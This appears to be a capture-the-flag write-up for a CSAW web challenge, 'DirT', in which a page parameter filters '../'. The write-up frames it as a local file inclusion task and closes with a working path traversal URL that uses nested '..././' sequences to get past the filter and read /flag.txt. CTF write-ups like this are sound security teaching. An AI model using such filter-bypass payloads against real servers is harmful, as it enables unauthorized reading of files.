# DirT
The web can be a DirTy place. I've done a truly mean thing. I filter out ../ from the page path. flag is at /flag.txt

http://web.chal.csaw.io:1001

---

When we first load the page, we are greeted with two links that lead to [http://web.chal.csaw.io:1001/?page=index.html](http://web.chal.csaw.io:1001/?page=index.html) and [http://web.chal.csaw.io:1001/?page=flex.html](http://web.chal.csaw.io:1001/?page=flex.html)

It seems like a typical LFI challenge, but with `../` filtered.
However, it is trival to bypass the filtering.

`http://web.chal.csaw.io:1001/?page=..././..././..././flag.txt`
